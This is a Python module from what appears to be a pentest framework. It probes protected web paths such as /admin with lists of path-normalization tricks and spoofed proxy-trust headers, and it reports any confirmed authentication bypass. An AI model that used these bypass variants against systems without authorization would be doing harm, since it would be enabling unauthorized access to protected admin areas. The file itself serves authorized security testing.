"""auth_bypass — can a protected path be reached WITHOUT credentials?

Answers the operator's concrete question: "is /admin really bypassable?".
Only ever run against an authorized, in-scope target (ExploitContext contract).

The module is SAFE-by-default and fully non-destructive — it sends **only GET
requests**, never writes, never brute-forces a password. It works in two moves:

  1. **Baseline.** GET the protected path. If the raw response is already a 2xx
     that serves real content (not a login page), the path is *unprotected* →
     high, confirmed. If it is a redirect-to-login / 401 / 403, the control is
     present and we proceed to move 2.
  2. **Bypass attempts.** Replay the SAME path through well-known reverse-proxy /
     path-normalization tricks and proxy-trust headers. A variant that returns
     2xx with a body clearly different from the blocked baseline (i.e. it served
     the protected content) is a *confirmed* bypass → high/critical.

When every attempt is blocked, that itself is a reportable result (info): proof
that the access control held against a battery of known bypasses — exactly the
kind of positive evidence a pentest report needs.

Each ExploitResult records the exact request line + response status — that record
IS the audit trail.
"""
import httpx

from backend.app.shasec.verifier import register
from backend.app.shasec.verifier._spec import origin
from backend.app.shasec.verifier.base import ExploitContext, ExploitModule, ExploitResult
from backend.common.enums import FindingSeverity
from backend.common.log import log

# Paths considered protected/sensitive by default. Operator can override/extend
# via ctx.options['bypass_paths'] = ['/admin', '/internal', ...].
_DEFAULT_PATHS = ('/admin', '/administrator', '/dashboard', '/internal', '/manage')

# Path-normalization variants. {p} is the target path WITHOUT leading slash
# (e.g. 'admin'). These exploit proxy vs. backend disagreement on canonicalization.
_PATH_TRICKS = (
    '/{p}/', '//{p}', '/./{p}', '/%2e/{p}', '/{p}/.', '/{p}%2f', '/{p}%20',
    '/{p}..;/', '/{p};/', '/;/{p}', '/{p}/..;/{p}', '/{p}?', '/%2f{p}',
    '/{P}',            # case flip (uppercased)
)

# Proxy-trust headers: many apps grant access when they believe the request is
# internal / already-rewritten by the fronting proxy.
_TRICK_HEADERS = (
    {'X-Forwarded-For': '127.0.0.1'},
    {'X-Forwarded-Host': 'localhost'},
    {'X-Original-URL': '__PATH__'},
    {'X-Rewrite-URL': '__PATH__'},
    {'X-Custom-IP-Authorization': '127.0.0.1'},
    {'X-Forwarded-For': '127.0.0.1', 'X-Forwarded-Proto': 'https'},
    {'X-Real-IP': '127.0.0.1'},
)

_HTTP_TIMEOUT = 8.0
_BLOCKED = (301, 302, 303, 307, 308, 401, 403)   # the "control is working" statuses


def _looks_like_login(body: str) -> bool:
    b = body[:4000].lower()
    return any(m in b for m in ('login', 'sign in', 'signin', 'password', 'authentification', 'connexion'))


class AuthBypassModule(ExploitModule):
    name = 'auth-bypass'
    category = 'broken-access-control'
    handles = ('api', 'graphql', 'website')
    timeout = 180

    async def run(self, ctx: ExploitContext) -> list[ExploitResult]:
        base = origin(ctx.target_url)
        if not base:
            return []
        paths = tuple(ctx.options.get('bypass_paths') or _DEFAULT_PATHS)
        results: list[ExploitResult] = []

        # follow_redirects=False so a 30x -> /login stays visible as "protected".
        async with httpx.AsyncClient(timeout=_HTTP_TIMEOUT, follow_redirects=False, verify=False,
                                     headers={'User-Agent': 'shasec/1.0 security audit'}) as client:
            for path in paths:
                await self._test_path(client, base, path, results)
        return results

    async def _test_path(self, client, base: str, path: str, results: list[ExploitResult]) -> None:
        path = '/' + path.strip('/')
        name = path.strip('/')
        url = f'{base}{path}'
        try:
            baseline = await client.get(url)
        except httpx.HTTPError:
            return
        log.info(f'[exploit:auth-bypass] baseline GET {url} -> {baseline.status_code}')

        # --- Move 1: is the path protected at all? --------------------------------
        if 200 <= baseline.status_code < 300 and not _looks_like_login(baseline.text or ''):
            results.append(ExploitResult(
                category=self.category,
                title=f'Chemin sensible accessible sans authentification : {path}',
                severity=FindingSeverity.high.value,
                confirmed=True,
                impact='Le chemin renvoie directement un contenu applicatif (2xx, pas une page de login) '
                       'sans aucune authentification. Contrôle d\'accès absent sur cette route.',
                request=f'GET {url}',
                response=f'HTTP {baseline.status_code} · {len(baseline.content)} octets · '
                         f'content-type={baseline.headers.get("content-type", "?")}',
            ))
            return

        if baseline.status_code not in _BLOCKED and baseline.status_code != 200:
            # 404/5xx etc. — nothing to bypass here.
            return

        baseline_len = len(baseline.content)

        # --- Move 2: try to bypass the control ------------------------------------
        tried = 0
        for tmpl in _PATH_TRICKS:
            variant = tmpl.replace('{p}', name).replace('{P}', name.upper())
            hit = await self._attempt(client, base, variant, {}, baseline, baseline_len, path, results, kind='path')
            tried += 1
            if hit:
                return
        for hdr in _TRICK_HEADERS:
            sent = {k: (path if v == '__PATH__' else v) for k, v in hdr.items()}
            hit = await self._attempt(client, base, path, sent, baseline, baseline_len, path, results, kind='header')
            tried += 1
            if hit:
                return

        # No bypass found — positive evidence worth reporting.
        results.append(ExploitResult(
            category=self.category,
            title=f'Contrôle d\'accès robuste sur {path} ({tried} contournements testés, tous bloqués)',
            severity=FindingSeverity.info.value,
            confirmed=True,
            impact='Le chemin est protégé (redirection login / 401 / 403) et a résisté aux contournements '
                   'connus (normalisation de chemin, en-têtes de confiance proxy). Aucun accès non authentifié.',
            request=f'GET {url}',
            response=f'baseline HTTP {baseline.status_code}; toutes variantes bloquées',
        ))

    async def _attempt(self, client, base, variant_path, headers, baseline, baseline_len,
                       orig_path, results, kind) -> bool:
        url = f'{base}{variant_path}'
        try:
            r = await client.get(url, headers=headers or None)
        except httpx.HTTPError:
            return False
        # A bypass = 2xx that is NOT a login page and materially differs from the
        # blocked baseline (served the protected content).
        if not (200 <= r.status_code < 300):
            return False
        if _looks_like_login(r.text or ''):
            return False
        if abs(len(r.content) - baseline_len) < 32 and baseline.status_code == 200:
            return False  # same body as baseline login page → not a real bypass
        detail = (f'header {headers}' if kind == 'header' else f'chemin {variant_path}')
        log.info(f'[exploit:auth-bypass] BYPASS {orig_path} via {detail} -> {r.status_code}')
        results.append(ExploitResult(
            category=self.category,
            title=f'Contournement d\'authentification confirmé sur {orig_path} (via {kind})',
            severity=FindingSeverity.critical.value,
            confirmed=True,
            impact=f'Le contrôle protégeant {orig_path} est contourné sans credentials en manipulant '
                   f'{"un en-tête de confiance proxy" if kind == "header" else "la normalisation du chemin"}. '
                   f'Un attaquant atteint la ressource protégée directement.',
            request=f'GET {url}' + (f'\n{chr(10).join(f"{k}: {v}" for k, v in headers.items())}' if headers else ''),
            response=f'HTTP {r.status_code} · {len(r.content)} octets · '
                     f'(baseline bloquée: HTTP {baseline.status_code})',
        ))
        return True


register(AuthBypassModule())
